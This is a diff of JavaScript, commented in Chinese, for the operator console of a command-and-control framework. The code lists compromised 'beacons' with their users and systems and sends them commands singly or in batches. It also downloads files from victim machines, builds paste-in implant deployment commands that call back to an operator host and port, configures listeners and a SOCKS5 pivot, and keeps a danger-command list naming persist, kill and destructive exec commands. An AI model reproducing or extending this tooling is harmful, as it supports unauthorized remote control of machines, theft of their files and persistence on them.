+    if (termAutoScroll) c2out.scrollTop = c2out.scrollHeight;
+}
+
+function clearTerm() { c2out.innerHTML = ''; termAppend('(输出日志已清空)', 'tinfo'); }
+function copyTerm() {
+    const text = Array.from(c2out.querySelectorAll('.term-line')).map(d => d.textContent).join('\n');
+    navigator.clipboard.writeText(text).then(() => flashBtnText(event.target, '已复制!'))
+        .catch(() => { const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta);
+                       ta.select(); document.execCommand('copy'); ta.remove(); flashBtnText(event.target, '已复制!'); });
+}
+function flashBtnText(btn, t) { if (!btn) return; const o = btn.textContent; btn.textContent = t; setTimeout(() => btn.textContent = o, 1200); }
+
+// ── 历史命令（localStorage，↑/↓） ──
+let termHist = [];
+try { termHist = JSON.parse(localStorage.getItem('fs3_c2_history') || '[]'); } catch (e) { termHist = []; }
+let histIdx = termHist.length;
+let histDraft = '';
+const c2cmd = document.getElementById('c2-cmd');
+
+function pushHistory(line) {
+    termHist.push(line);
+    if (termHist.length > 200) termHist = termHist.slice(-200);
+    localStorage.setItem('fs3_c2_history', JSON.stringify(termHist));
+    histIdx = termHist.length;
+}
+
+// ── Tab 补全 ──
+let compState = null;
+const compBox = document.getElementById('c2-comp');
+
+function completionCandidates() {
+    const text = c2cmd.value;
+    const caret = c2cmd.selectionStart;
+    const before = text.slice(0, caret);
+    const m = before.match(/([\w.\-/]*)$/);
+    const token = m ? m[1] : '';
+    const isCmd = !before.slice(0, before.length - token.length).trim();
+    let pool = isCmd ? builtinCmds.concat(implantNames, smodNames)
+                     : beaconIds.concat(implantNames, smodNames);
+    const matches = Array.from(new Set(pool)).filter(c => c.startsWith(token) && c !== token).sort();
+    return {token, matches};
+}
+
+function commonPrefix(list) {
+    if (!list.length) return '';
+    let p = list[0];
+    for (const s of list.slice(1)) { while (!s.startsWith(p)) p = p.slice(0, -1); if (!p) break; }
+    return p;
+}
+
+function replaceToken(token, replace) {
+    const caret = c2cmd.selectionStart;
+    const before = c2cmd.value.slice(0, caret);
+    const after = c2cmd.value.slice(caret);
+    c2cmd.value = before.slice(0, before.length - token.length) + replace + after;
+    const pos = before.length - token.length + replace.length;
+    c2cmd.setSelectionRange(pos, pos);
+}
+
+function showComp(matches, idx) {
+    compBox.innerHTML = matches.map((m, i) => {
+        const desc = descFor(m);
+        return '<div class="comp-item' + (i === idx ? ' active' : '') + '" data-i="' + i + '">' +
+               '<span class="comp-name">' + escapeHtml(m) + '</span>' +
+               (desc ? '<span class="comp-desc">' + escapeHtml(desc) + '</span>' : '') +
+               '</div>';
+    }).join('');
+    compBox.style.display = 'block';
+    compBox.querySelectorAll('.comp-item').forEach(el => el.addEventListener('mousedown', function(e) {
+        e.preventDefault();
+        replaceToken(compState.token, matches[parseInt(el.dataset.i, 10)]);
+        hideComp();
+        c2cmd.focus();
+    }));
+}
+function hideComp() { compBox.style.display = 'none'; compState = null; }
+
+function doComplete() {
+    const {token, matches} = completionCandidates();
+    if (!matches.length) { hideComp(); return; }
+    const same = compState && compState.token === token && compState.matches.join('|') === matches.join('|');
+    if (!same) {
+        compState = {token, matches, idx: 0};
+        const common = commonPrefix(matches);
+        if (common.length > token.length) {
+            replaceToken(token, common);
+            // 公共前缀替换后文本已变,同步 token,否则回车/点击选中时
+            // replaceToken 按旧 token 计算替换点,会在拼接结果后重复追加选中项
+            compState.token = common;
+        }
+        showComp(matches, 0);
+    } else {
+        compState.idx = (compState.idx + 1) % matches.length;
+        replaceToken(token, matches[compState.idx]);
+        compState.token = matches[compState.idx];  // 文本已变,同步 token
+        showComp(matches, compState.idx);
+    }
+}
+
+c2cmd.addEventListener('keydown', function(e) {
+    if (e.key === 'Tab') { e.preventDefault(); doComplete(); return; }
+    const compOpen = compState && compBox.style.display === 'block';
+    if (compOpen) {
+        // 补全框打开时:↑↓ 选其他补全,回车选中,Shift+回车换行,Esc 关闭
+        if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
+            e.preventDefault();
+            const n = compState.matches.length;
+            const dir = e.key === 'ArrowDown' ? 1 : -1;
+            compState.idx = (compState.idx + dir + n) % n;
+            showComp(compState.matches, compState.idx);
+            return;
+        }
+        if (e.key === 'Enter' && !e.shiftKey && !e.isComposing) {
+            e.preventDefault();
+            replaceToken(compState.token, compState.matches[compState.idx]);
+            hideComp();
+            c2cmd.focus();
+            return;
+        }
+        if (e.key === 'Escape') { e.preventDefault(); hideComp(); return; }
+    }
+    hideComp();
+    if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (histIdx > 0) {
+            if (histIdx === termHist.length) histDraft = c2cmd.value;
+            histIdx--;
+            c2cmd.value = termHist[histIdx];
+        }
+    } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (histIdx < termHist.length) {
+            histIdx++;
+            c2cmd.value = histIdx === termHist.length ? histDraft : termHist[histIdx];
+        }
+    } else if (e.key === 'Enter' && !e.shiftKey && !e.isComposing) {
+        // 回车直接执行,Shift+回车换行(中文输入法组词中的回车不执行)
+        e.preventDefault();
+        execCmd();
+    }
+});
+document.addEventListener('click', function(e) { if (!compBox.contains(e.target) && e.target !== c2cmd) hideComp(); });
+
+// ── 终端命令执行 ──
+async function termCmd(line) {
+    termAppend('pyexec> ' + line, 'techo');
+    // 终端 use <bid> 选中:同步前端 currentBid + 启动结果轮询(与点击 beacon 卡片等价)
+    const m = line.trim().match(/^use\s+([0-9a-f]{16})/i);
+    if (m) {
+        currentBid = m[1];
+        shownResultKeys = {};
+        startResultPolling();
+        document.getElementById('console-beacon').textContent = 'beacon: ' + currentBid.slice(0, 8) + '…';
+        loadBeacons();
+    }
+    try {
+        const resp = await fetch('/api/c2/exec', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({line: line})});
+        const data = await resp.json();
+        termAppend((data.ok ? '' : '[!] ' + (data.error || '') + '\n') + (data.output || ''), '');
+    } catch (err) {
+        termAppend('[!] 请求失败: ' + err.message, 'terr');
+    }
+    loadBeacons();
+    // 命令执行后加速拉一次结果(如 exec 已立即回传),不依赖 2s 轮询周期
+    setTimeout(trackBeaconResults, 800);
+}
+
+function execCmd() {
+    const raw = c2cmd.value;
+    // 支持多行(Shift+回车):逐行顺序执行,每行单独进历史
+    const lines = raw.split('\n').map(s => s.trim()).filter(Boolean);
+    if (!lines.length) return;
+    // 危险命令二次确认(kill/exit/persist/set_key/raw/uplevel/破坏性 exec 等)
+    const danger = lines.filter(isDangerCmd);
+    if (danger.length && !confirm('检测到危险命令:\n' + danger.join('\n') + '\n\n确认执行？')) return;
+    lines.forEach(l => pushHistory(l));
+    c2cmd.value = '';
+    (async function() {
+        for (const l of lines) await termCmd(l);
+    })();
+}
+
+// ── 危险命令识别(二次确认用) ──
+const DANGER_CMDS = ['kill', 'exit', 'persist', 'set_key', 'raw', 'reload', 'uplevel', 'break', 'set_host', 'survive', 's_exec'];
+function isDangerCmd(line) {
+    const t = (line || '').trim().toLowerCase();
+    if (!t) return false;
+    const first = t.split(/\s+/)[0];
+    if (DANGER_CMDS.indexOf(first) !== -1) return true;
+    if (first === 'exec' && /(rm |del |rd |format |shutdown|reboot|taskkill|pkill |killall )/.test(t)) return true;
+    return false;
+}
+
+// ══════════ 状态加载 / Beacon 列表 ══════════
+let c2StatusDetail = null;
+
+async function loadStatus() {
+    const errBox = document.getElementById('c2-error');
+    errBox.style.display = 'none';
+    try {
+        const resp = await fetch('/api/c2/status');
+        const data = await resp.json();
+        if (!data.enabled) { errBox.textContent = data.error || 'C2 未启用'; errBox.style.display = 'block'; return; }
+        if (!data.running) { errBox.textContent = data.error || 'C2 启动失败'; errBox.style.display = 'block'; return; }
+    } catch (e) {
+        errBox.textContent = '状态请求失败: ' + e.message; errBox.style.display = 'block'; return;
+    }
+    loadStatusDetail();
+    loadBeacons();
+    loadModules();
+    loadCommands();
+    loadAutoCommands();
+    loadModuleFiles();
+}
+
+async function loadStatusDetail() {
+    try {
+        const resp = await fetch('/api/c2/status-detail');
+        const data = await resp.json();
+        if (!data.ok) return;
+        c2StatusDetail = data;
+        document.getElementById('st-beacons').textContent = data.counts.beacons;
+        document.getElementById('st-pending').textContent = data.counts.total_pending;
+        const on = Object.entries(data.listeners || {}).filter(function(e) { return e[1] && e[1].enabled; });
+        document.getElementById('st-listen').textContent = on.map(function(e) {
+            return e[0] + ':' + e[1].port;
+        }).join(' ') || '仅 beacon';
+        document.getElementById('st-key').textContent = data.implant_key_fp || '-';
+        const ckEl = document.getElementById('st-clientkey');
+        if (data.client_key_ready) {
+            ckEl.textContent = 'client_key 已生成';
+            ckEl.style.color = 'var(--success)';
+        } else {
+            ckEl.innerHTML = 'client_key 未生成 <button class="btn btn-sm" onclick="genClientKey()" title="运行 s_exec keygen">一键生成</button>';
+            ckEl.style.color = 'var(--danger)';
+        }
+    } catch (e) {}
+}
+
+async function genClientKey() {
+    if (!confirm('生成 client_key 并写回 config.json？(client 通道加密密钥,生成后即可用 client 连接)')) return;
+    const resp = await fetch('/api/c2/keygen', {method: 'POST'});
+    const data = await resp.json();
+    showNotice((data.ok ? '✓ ' : '✗ ') + (data.message || data.error || ''), data.ok);
+    loadStatusDetail();
+}
+
+function showNotice(msg, ok) {
+    const el = document.getElementById('c2-notice');
+    el.textContent = msg;
+    el.style.display = 'block';
+    el.style.background = ok === false ? 'rgba(220,60,60,.12)' : 'rgba(40,180,100,.12)';
+    el.style.color = ok === false ? 'var(--danger)' : 'var(--success)';
+    clearTimeout(showNotice._t);
+    showNotice._t = setTimeout(function() { el.style.display = 'none'; }, 8000);
+}
+
+async function loadCommands() {
+    try {
+        const resp = await fetch('/api/c2/commands');
+        const data = await resp.json();
+        if (data.ok) builtinCmds = data.commands || [];
+    } catch (e) {}
+}
+
+let allBeacons = [];
+let selectedBeacons = {};   // bid -> true
+
+async function loadBeacons() {
+    try {
+        const resp = await fetch('/api/c2/beacons');
+        const data = await resp.json();
+        if (!data.ok) return;
+        const prev = {};
+        allBeacons.forEach(function(b) { prev[b.client_id] = b; });
+        allBeacons = data.beacons || [];
+        // 上线/掉线通知(与上次对比;仅在有上一次快照时提示,避免首屏刷屏)
+        if (Object.keys(prev).length) {
+            const nowIds = new Set(allBeacons.map(function(b) { return b.client_id; }));
+            const up = Object.keys(prev).filter(function(id) { return !nowIds.has(id); });
+            const news = allBeacons.filter(function(b) { return !prev[b.client_id]; });
+            if (news.length) showNotice('⬆ 新 beacon 上线: ' + news.map(function(b) { return b.client_id.slice(0, 8) + ' (' + (b.sys_user || '?') + ')'; }).join(', '), true);
+            if (up.length) showNotice('⬇ beacon 掉线/清理: ' + up.map(function(id) { return id.slice(0, 8); }).join(', '), false);
+        }
+        renderBeaconList();
+    } catch (e) {}
+}
+
+function beaconSearchText(b) {
+    return (b.client_id + ' ' + (b.sys_user || '') + ' ' + (b.sys_platform || '') + ' ' +
+            (b.sys_os || '') + ' ' + (b.tags || []).join(' ') + ' ' + (b.remark || '')).toLowerCase();
+}
+
+function fmtAgo(tsStr) {
+    if (!tsStr) return '';
+    const t = new Date(tsStr.replace(' ', 'T')).getTime();
+    if (!t) return '';
+    const s = Math.max(0, (Date.now() - t) / 1000);
+    if (s < 90) return Math.round(s) + 's 前';
+    if (s < 3600) return Math.round(s / 60) + 'm 前';
+    if (s < 86400) return Math.round(s / 3600) + 'h 前';
+    return Math.round(s / 86400) + 'd 前';
+}
+
+function renderBeaconList() {
+    const list = document.getElementById('beacon-list');
+    beaconIds = [];
+    const q = (document.getElementById('beacon-search').value || '').trim().toLowerCase();
+    const filtered = q ? allBeacons.filter(function(b) { return beaconSearchText(b).includes(q); }) : allBeacons;
+    if (!filtered.length) {
+        list.innerHTML = '<span class="empty">' + (allBeacons.length ? '无匹配 beacon' : '暂无在线 beacon') + '</span>';
+        updateSelInfo();
+        return;
+    }
+    let html = '';
+    for (const b of filtered) {
+        beaconIds.push(b.client_id);
+        const sel = b.client_id === currentBid ? 'selected' : '';
+        const checked = selectedBeacons[b.client_id] ? ' checked' : '';
+        const online = '在线';
+        const since = fmtAgo(b.first_seen);
+        const last = fmtAgo(b.last_seen);
+        html += '<div class="beacon-card ' + sel + '" onclick="selectBeacon(\'' + b.client_id + '\')">' +
+            '<div class="bc-head">' +
+            '<input type="checkbox" class="bc-check" ' + checked + ' onclick="event.stopPropagation();toggleBeaconSel(\'' + b.client_id + '\')" aria-label="选择 beacon" title="多选">' +
+            '<span class="li-title" style="cursor:pointer;" title="点击查看详情" onclick="event.stopPropagation();openBeaconDetail(\'' + b.client_id + '\')">' + escapeHtml(b.client_id) + '</span>' +
+            '<span class="dot-online" style="margin:0;" title="' + online + '"></span></div>' +
+            '<div class="bc-meta">' +
+            escapeHtml(b.sys_platform || '?') + ' · ' + escapeHtml(b.sys_user || '?') + ' · ' + escapeHtml(b.sys_os || '') + '<br>' +
+            (b.via ? 'via ' + escapeHtml(b.via) + ' · ' : '') +
+            (b.is_shell ? 'shell · ' : '') + (b.is_fork ? 'fork · ' : '') +
+            '结果 ' + (b.result_count || 0) + ' · 上线 ' + since + ' · 心跳 ' + last +
+            '</div>' +
+            (b.tags && b.tags.length ? '<div class="bc-tags">' + b.tags.map(function(t) { return '<span class="badge badge-node" style="font-size:0.62rem;">#' + escapeHtml(t) + '</span>'; }).join(' ') + '</div>' : '') +
+            (b.remark ? '<div class="bc-remark" style="font-size:0.68rem;color:var(--text-muted);margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">📝 ' + escapeHtml(b.remark) + '</div>' : '') +
+            '</div>';
+    }
+    list.innerHTML = html;
+    updateSelInfo();
+}
+
+function updateSelInfo() {
+    const n = Object.keys(selectedBeacons).length;
+    document.getElementById('beacon-sel-info').textContent = '已选 ' + n;
+    document.getElementById('beacon-batch-bar').style.display = n ? 'flex' : 'none';
+}
+
+function toggleBeaconSel(bid) {
+    if (selectedBeacons[bid]) delete selectedBeacons[bid];
+    else selectedBeacons[bid] = true;
+    updateSelInfo();
+    renderBeaconList();
+}
+
+function clearBeaconSel() {
+    selectedBeacons = {};
+    updateSelInfo();
+    renderBeaconList();
+}
+
+async function execBatchCmd() {
+    const line = (document.getElementById('batch-cmd').value || '').trim();
+    const bids = Object.keys(selectedBeacons);
+    if (!line) { showNotice('批量命令为空', false); return; }
+    if (!bids.length) { showNotice('未选择 beacon', false); return; }
+    if (isDangerCmd(line) && !confirm('批量执行危险命令: ' + line + '\n目标 ' + bids.length + ' 个 beacon，确认？')) return;
+    let okN = 0;
+    for (const bid of bids) {
+        try {
+            const resp = await fetch('/api/c2/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({line: 'use ' + bid})});
+            await resp.json();
+            const resp2 = await fetch('/api/c2/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({line: line})});
+            const d2 = await resp2.json();
+            if (d2.ok) okN++;
+        } catch (e) {}
+    }
+    showNotice('批量执行完成: ' + okN + '/' + bids.length + ' 成功', okN === bids.length);
+    document.getElementById('batch-cmd').value = '';
+    clearBeaconSel();
+}
+
+async function selectBeacon(bid) {
+    currentBid = bid;
+    shownResultKeys = {};
+    startResultPolling();
+    document.getElementById('console-beacon').textContent = 'beacon: ' + bid.slice(0, 8) + '…';
+    termAppend('[>] 已选中 beacon: ' + bid, 'tinfo');
+    // 同步后端 Dispatcher 的 current_beacon(等价 use <bid>),终端命令直接作用于选中 beacon
+    try {
+        const resp = await fetch('/api/c2/select', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({client_id: bid})});
+        const data = await resp.json();
+        if (!data.ok) termAppend('[!] 后端同步失败: ' + (data.message || data.error || ''), 'terror');
+    } catch (e) {
+        termAppend('[!] 后端同步失败: ' + e.message, 'terror');
+    }
+    loadBeacons();
+}
+
+// ══════════ beacon 结果自动回显(轮询当前选中 beacon,增量显示) ══════════
+let shownResultKeys = {};
+let resultPollTimer = null;
+
+function trackBeaconResults() {
+    if (!currentBid) return;
+    fetch('/api/c2/beacon/' + encodeURIComponent(currentBid))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (!d.ok || !d.beacon) return;
+            const results = d.beacon.results || [];
+            for (let i = 0; i < results.length; i++) {
+                const res = results[i];
+                const key = res.task_id + '@' + (res.received_at || '');
+                if (shownResultKeys[key]) continue;
+                shownResultKeys[key] = true;
+                const out = res.output || '';
+                const err = res.error || '';
+                if (err) {
+                    termAppend('[结果] ' + (res.task_id || '?') + ': [error] ' + err, 'terr');
+                } else if (out) {
+                    termAppend('[结果] ' + (res.task_id || '?') + ': ' + out, 'tok');
+                } else {
+                    termAppend('[结果] ' + (res.task_id || '?') + ': (无输出)', 'tplain');
+                }
+            }
+        })
+        .catch(function() {});
+}
+
+function startResultPolling() {
+    if (resultPollTimer) clearInterval(resultPollTimer);
+    resultPollTimer = setInterval(trackBeaconResults, 2000);
+}
+
+// ── 自动刷新 ──
+let autoRefreshTimer = null;
+function toggleAutoRefresh() {
+    const btn = document.getElementById('auto-refresh-btn');
+    if (autoRefreshTimer) { clearInterval(autoRefreshTimer); autoRefreshTimer = null; btn.textContent = '自动刷新: 关'; }
+    else { autoRefreshTimer = setInterval(loadBeacons, 10000); btn.textContent = '自动刷新: 开'; loadBeacons(); }
+}
+
+// ══════════ Beacon 详情抽屉 ══════════
+let bdBeacon = null;
+
+async function openBeaconDetail(bid) {
+    document.getElementById('beacon-detail-modal').style.display = 'flex';
+    document.getElementById('bd-title').textContent = 'Beacon ' + bid;
+    document.getElementById('bd-remark').value = '';
+    document.getElementById('bd-fpath').value = '/';
+    document.getElementById('bd-info').textContent = '加载中...';
+    document.getElementById('bd-tasks').textContent = '';
+    try {
+        const resp = await fetch('/api/c2/beacon/' + encodeURIComponent(bid) + '/detail');
+        const data = await resp.json();
+        if (!data.ok) { document.getElementById('bd-info').textContent = data.error || '加载失败'; return; }
+        bdBeacon = data.beacon;
+        const b = bdBeacon;
+        document.getElementById('bd-remark').value = b.remark || '';
+        document.getElementById('bd-title').textContent = 'Beacon ' + b.client_id;
+        const lines = [
+            'client_id : ' + b.client_id,
+            '用户      : ' + (b.sys_user || '-') + ' @ ' + (b.sys_os || '-'),
+            '平台      : ' + (b.sys_platform || '-'),
+            'via       : ' + (b.via || '直连') + (b.is_fork ? ' (fork)' : '') + (b.is_shell ? ' (shell)' : ''),
+            '标签      : ' + ((b.tags || []).join(', ') || '-'),
+            '首次上线  : ' + (b.first_seen || '-'),
+            '最后心跳  : ' + (b.last_seen || '-'),
+            '结果数    : ' + (b.result_count || 0) + ' / 待办任务: ' + (b.pending_count || 0),
+        ];
+        document.getElementById('bd-info').textContent = lines.join('\n');
+        renderBdTasks();
+    } catch (e) {
+        document.getElementById('bd-info').textContent = '请求失败: ' + e.message;
+    }
+}
+
+function renderBdTasks() {
+    const box = document.getElementById('bd-tasks');
+    if (!bdBeacon) return;
+    const tasks = bdBeacon.tasks || [];
+    if (!tasks.length) { box.textContent = '（无待办任务）'; return; }
+    box.textContent = tasks.map(function(t) {
+        return '[' + (t.is_init ? 'init' : 'task') + '] ' + (t.task_id || '').slice(0, 8) + ' ' + (t.created_at || '') + ' ' + (t.result_processor ? '(proc:' + t.result_processor + ')' : '') + ' :: ' + (t.code_preview || '');
+    }).join('\n');
+}
+
+function closeBeaconDetail() {
+    document.getElementById('beacon-detail-modal').style.display = 'none';
+    bdBeacon = null;
+}
+
+function fpath() {
+    return (document.getElementById('bd-fpath').value || '').trim() || '.';
+}
+
+async function saveBeaconRemark() {
+    if (!bdBeacon) return;
+    const remark = document.getElementById('bd-remark').value.trim();
+    const resp = await fetch('/api/c2/beacon/' + encodeURIComponent(bdBeacon.client_id) + '/remark', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({remark: remark})});
+    const data = await resp.json();
+    showNotice((data.ok ? '✓ 备注已保存' : '✗ 保存失败'), data.ok);
+    loadBeacons();
+}
+
+function bdQuick(cmd) {
+    if (!bdBeacon) return;
+    currentBid = bdBeacon.client_id;
+    termAppend('pyexec> use ' + currentBid, 'techo');
+    termCmd(cmd);
+}
+
+function bdUseAndClose() {
+    if (!bdBeacon) return;
+    selectBeacon(bdBeacon.client_id);
+    closeBeaconDetail();
+}
+
+async function bdDownload() {
+    if (!bdBeacon) return;
+    const p = fpath();
+    if (!p) { showNotice('路径为空', false); return; }
+    const ok = confirm('对 ' + bdBeacon.client_id + ' 下发 download: ' + p + '\n文件会分块传回服务器(reports/c2/ 或模块输出目录),确认？');
+    if (!ok) return;
+    termAppend('pyexec> use ' + bdBeacon.client_id, 'techo');
+    await termCmd('download ' + p);
+}
+
+// ══════════ 部署向导 ══════════
+let dpDeploy = '';
+
+function openDeployModal() {
+    document.getElementById('deploy-modal').style.display = 'flex';
+    document.getElementById('dp-status').textContent = '';
+    document.getElementById('dp-output').style.display = 'none';
+    document.getElementById('dp-note').style.display = 'none';
+    dpDeploy = '';
+}
+
+function closeDeployModal() { document.getElementById('deploy-modal').style.display = 'none'; }
+
+async function doBuildDeploy() {
+    const host = document.getElementById('dp-host').value.trim();
+    const port = parseInt(document.getElementById('dp-port').value, 10) || 0;
+    const interval = parseInt(document.getElementById('dp-interval').value, 10) || 60;
+    const jitter = parseFloat(document.getElementById('dp-jitter').value) || 0.2;
+    const statusEl = document.getElementById('dp-status');
+    if (!host || port <= 0) { statusEl.textContent = 'host/port 必填'; statusEl.style.color = 'var(--danger)'; return; }
+    statusEl.textContent = '生成中...';
+    statusEl.style.color = 'var(--text-muted)';
+    try {
+        const resp = await fetch('/api/c2/build-deploy', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({host: host, port: port, interval: interval, jitter: jitter})});
+        const data = await resp.json();
+        if (!data.ok) { statusEl.textContent = '✗ ' + (data.error || '生成失败'); statusEl.style.color = 'var(--danger)'; return; }
+        dpDeploy = data.deploy || '';
+        document.getElementById('dp-output').textContent = dpDeploy;
+        document.getElementById('dp-output').style.display = 'block';
+        const noteEl = document.getElementById('dp-note');
+        noteEl.style.display = 'block';
+        noteEl.textContent = '回连 ' + host + ':' + port + ' · 间隔 ' + interval + 's ±' + jitter +
+            (data.key_fp ? ' · implant_key ' + data.key_fp : '') +
+            (data.file ? ' · 产物文件: ' + data.file : '') +
+            '\n部署:Linux/macOS 粘贴到终端执行;Windows 建议存成 .py 后 python payload.py(直接 echo 管道在 cmd 下会丢引号)。';
+        statusEl.textContent = '✓ 生成成功';
+        statusEl.style.color = 'var(--success)';
+    } catch (e) {
+        statusEl.textContent = '✗ 请求失败: ' + e.message;
+        statusEl.style.color = 'var(--danger)';
+    }
+}
+
+function dpCopy() {
+    if (!dpDeploy) { showNotice('先点击「生成部署命令」', false); return; }
+    navigator.clipboard.writeText(dpDeploy).then(function() { showNotice('✓ 部署命令已复制', true); },
+        function() { showNotice('复制失败,请手动选择文本', false); });
+}
+
+// ══════════ 操作日志(审计) ══════════
+let c2Audit = [];
+
+function openAuditModal() {
+    document.getElementById('audit-modal').style.display = 'flex';
+    loadAudit();
+}
+
+function closeAuditModal() { document.getElementById('audit-modal').style.display = 'none'; }
+
+async function loadAudit() {
+    try {
+        const resp = await fetch('/api/c2/audit?limit=300');
+        const data = await resp.json();
+        if (data.ok) { c2Audit = data.audit || []; renderAudit(); }
+    } catch (e) {}
+}
+
+function renderAudit() {
+    const q = (document.getElementById('audit-search').value || '').trim().toLowerCase();
+    const list = q ? c2Audit.filter(function(e) {
+        return ((e.line || '') + ' ' + (e.client || '') + ' ' + (e.ts_iso || '')).toLowerCase().indexOf(q) !== -1;
+    }) : c2Audit;
+    document.getElementById('audit-list').textContent = list.map(function(e) {
+        return '[' + (e.ts_iso || '') + '] ' + (e.client ? '#' + String(e.client).slice(0, 8) + ' ' : '') + '> ' + (e.line || '') + (e.output_head ? '\n    ↳ ' + e.output_head : '');
+    }).join('\n') || '（暂无操作记录）';
+}
+
+function exportC2Events() {
+    const bid = currentBid || '';
+    const url = '/api/c2/export-events' + (bid ? '?bid=' + encodeURIComponent(bid) : '');
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = '';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    showNotice('事件导出已开始' + (bid ? '(当前 beacon)' : '(全部)'), true);
+}
+
+// ══════════ 通道配置 ══════════
+function openListenerModal() {
+    document.getElementById('listener-modal').style.display = 'flex';
+    document.getElementById('lc-status').textContent = '';
+    const c = (c2StatusDetail && c2StatusDetail.config) || {};
+    function setv(id, v) { document.getElementById(id).value = v; }
+    setv('lc-server_port', c.server_port != null ? c.server_port : '');
+    setv('lc-client_port', c.client_port != null ? c.client_port : '');
+    setv('lc-https_port', c.https_port || 0);
+    setv('lc-dns_port', c.dns_port || 0);
+    setv('lc-relay_port', c.relay_port || 0);
+    setv('lc-socks5_port', c.socks5_port || 0);
+    setv('lc-client_timeout', c.client_timeout != null ? c.client_timeout : '');
+    setv('lc-exec_timeout', c.exec_timeout != null ? c.exec_timeout : '');
+    const hint = document.getElementById('lc-socks5-hint');
+    if ((c.socks5_port || 0) > 0) {
+        hint.style.display = 'block';
+        hint.textContent = 'SOCKS5 代理已启用: ' + (c.server_host || '0.0.0.0') + ':' + c.socks5_port + ' —— 浏览器/工具配 SOCKS5 指向该地址即可,目标=当前选中 beacon(需先 use)。';
+    } else {
+        hint.style.display = 'none';
+    }
+}
+
+function closeListenerModal() { document.getElementById('listener-modal').style.display = 'none'; }
+
+async function saveListenerConfig() {
+    const payload = {};
+    ['lc-server_port', 'lc-client_port', 'lc-https_port', 'lc-dns_port', 'lc-relay_port', 'lc-socks5_port',
+     'lc-client_timeout', 'lc-exec_timeout'].forEach(function(id) {
+        const raw = document.getElementById(id).value.trim();
+        const key = id.replace('lc-', '');
+        payload[key] = raw === '' ? 0 : parseInt(raw, 10);
+    });
+    const statusEl = document.getElementById('lc-status');
+    statusEl.textContent = '保存中...';
+    statusEl.style.color = 'var(--text-muted)';
+    try {
+        const resp = await fetch('/api/c2/listener-config', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)});
+        const data = await resp.json();
+        statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
+        statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
+        if (data.ok) loadStatusDetail();
+    } catch (e) {
+        statusEl.textContent = '✗ 请求失败: ' + e.message;
+        statusEl.style.color = 'var(--danger)';
+    }
+}
+
+async function restartC2() {
+    if (!confirm('重启 C2 server？beacon 会自动重连(间隔约一个回连周期),当前待办任务保留。确认重启？')) return;
+    const statusEl = document.getElementById('lc-status');
+    statusEl.textContent = '重启中...';
+    statusEl.style.color = 'var(--text-muted)';
+    try {
+        const resp = await fetch('/api/c2/restart', {method: 'POST'});
+        const data = await resp.json();
+        statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
+        statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
+        if (data.ok) { setTimeout(loadStatusDetail, 1500); }
+    } catch (e) {
+        statusEl.textContent = '✗ 请求失败: ' + e.message;
+        statusEl.style.color = 'var(--danger)';
+    }
+}
+
+// ══════════ 模块面板 ══════════
+let currentMtab = 'implant';
+function switchMtab(tab) {
+    currentMtab = tab;
+    document.querySelectorAll('[data-mtab]').forEach(t => t.classList.toggle('active', t.dataset.mtab === tab));
+    document.getElementById('mtab-implant').style.display = tab === 'implant' ? '' : 'none';
+    document.getElementById('mtab-server').style.display = tab === 'server' ? '' : 'none';
+    document.getElementById('mtab-manage').style.display = tab === 'manage' ? '' : 'none';
+    if (tab === 'manage') loadModuleFiles();
+    return false;
+}
+
+let implantMods = [];
+let serverMods = [];
+
+async function loadModules() {
+    try {
+        const resp = await fetch('/api/c2/modules');
+        const data = await resp.json();
+        if (!data.ok) {
+            document.getElementById('module-list').innerHTML = '<div class="flash error">' + escapeHtml(data.error) + '</div>';
+            return;
+        }
+        implantMods = data.implant || [];
+        serverMods = data.server || [];
+        implantNames = implantMods.map(m => m.name);
+        smodNames = serverMods.map(m => m.name);
+        Object.keys(modDescs).forEach(k => delete modDescs[k]);
+        implantMods.forEach(m => { if (m.desc) modDescs[m.name] = m.desc; });
+        serverMods.forEach(m => { if (m.desc) modDescs[m.name] = m.desc; });
+        renderModuleList();
+        renderSmoduleList();
+    } catch (e) {}
+}
+
+function renderModuleList() {
+    const q = (document.getElementById('mod-search').value || '').trim().toLowerCase();
+    const box = document.getElementById('module-list');
+    const list = q ? implantMods.filter(m => m.name.toLowerCase().includes(q)) : implantMods;
+    if (!list.length) { box.innerHTML = '<span class="empty">无匹配模块</span>'; return; }
+    box.innerHTML = list.map(m => {
+        const params = (m.params || []).map(p => Array.isArray(p) ? p[0] : p).join(' ');
+        return '<div class="mod-item" onclick="openModuleModal(\'' + escapeHtml(m.name) + '\')" title="' + escapeHtml(m.desc || m.name) + '">' +
+            '<div class="mod-row"><span class="mod-name">' + escapeHtml(m.name) + '</span>' +
+            (params ? '<span class="mod-params">' + escapeHtml(params) + '</span>' : '') + '</div>' +
+            '<div class="mod-desc">' + escapeHtml((m.desc || '').slice(0, 60)) + '</div></div>';
+    }).join('');
+}
+
+function renderSmoduleList() {
+    const box = document.getElementById('smodule-list');
+    if (!serverMods.length) { box.innerHTML = '<span class="empty">暂无 server 模块</span>'; return; }
+    box.innerHTML = serverMods.map(m => {
+        const params = (m.params || []).map(p => Array.isArray(p) ? p[0] : p).join(' ');
+        return '<div class="mod-item" onclick="openServerModuleModal(\'' + escapeHtml(m.name) + '\')" title="' + escapeHtml(m.desc || '') + '">' +
+            '<div class="mod-row"><span class="badge badge-purple" style="font-size:0.62rem;">srv</span>' +
+            '<span class="mod-name">' + escapeHtml(m.name) + '</span>' +
